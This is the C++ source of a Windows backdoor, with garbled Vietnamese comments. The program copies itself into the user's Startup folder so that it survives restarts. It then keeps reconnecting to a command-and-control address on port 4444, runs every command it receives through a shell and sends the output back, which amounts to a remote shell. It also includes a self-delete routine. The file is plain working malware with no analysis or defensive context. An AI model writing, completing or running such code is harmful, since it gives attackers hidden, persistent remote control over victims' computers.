#include <iostream>
#include <fstream>
#include <windows.h>
//#include <winsock2.h>
#include <string>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "127.0.0.1" // ??a ch? C&C
#define SERVER_PORT 4444       // C?ng l?ng nghe c?a C&C
#define RECONNECT_DELAY 30000  // Th?i gian ch? ?? k?t n?i l?i (30 giây)

// Tên file cho backdoor
const char* BACKDOOR_NAME = "Backdoor.exe";

// Hàm t? cài ??t backdoor
void install_backdoor() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH); // L?y ???ng d?n file hi?n t?i

    // L?y ???ng d?n th? m?c Startup an toàn
    char* appdata = nullptr;
    size_t len = 0;
    _dupenv_s(&appdata, &len, "APPDATA");
    if (appdata != nullptr) {
        std::string startup_path = std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + BACKDOOR_NAME;
        CopyFileA(path, startup_path.c_str(), FALSE);
        free(appdata); // Gi?i phóng b? nh? ?ã c?p phát
    }
}

// Hàm xóa b?n thân
void self_delete() {
    char cmd[1024];
    sprintf_s(cmd, "cmd.exe /c del %s", BACKDOOR_NAME);
    system(cmd);
}

// Hàm k?t n?i ??n C&C
SOCKET connect_to_cc() {
    WSADATA wsa;
    SOCKET s;
    sockaddr_in server;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    s = socket(AF_INET, SOCK_STREAM, 0);

    if (s == INVALID_SOCKET) {
        return INVALID_SOCKET;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) {
        closesocket(s);
        return INVALID_SOCKET;
    }

    return s;
}

// Hàm nh?n l?nh t? C&C và th?c thi
void handle_commands(SOCKET s) {
    char buffer[1024];
    while (true) {
        memset(buffer, 0, sizeof(buffer));

        int recv_size = recv(s, buffer, sizeof(buffer), 0);
        if (recv_size <= 0) {
            break;
        }

        // Th?c thi l?nh
        FILE* fp = _popen(buffer, "r");
        if (fp) {
            char result[1024];
            memset(result, 0, sizeof(result));

            while (fgets(result, sizeof(result), fp) != NULL) {
                send(s, result, strlen(result), 0);
            }

            _pclose(fp);
        }
    }
}

int main() {
    // Cài ??t backdoor
    install_backdoor();

    while (true) {
        SOCKET s = connect_to_cc();

        if (s != INVALID_SOCKET) {
            handle_commands(s);
            closesocket(s);
        }
        else {
            Sleep(RECONNECT_DELAY);
        }
    }

    return 0;
}
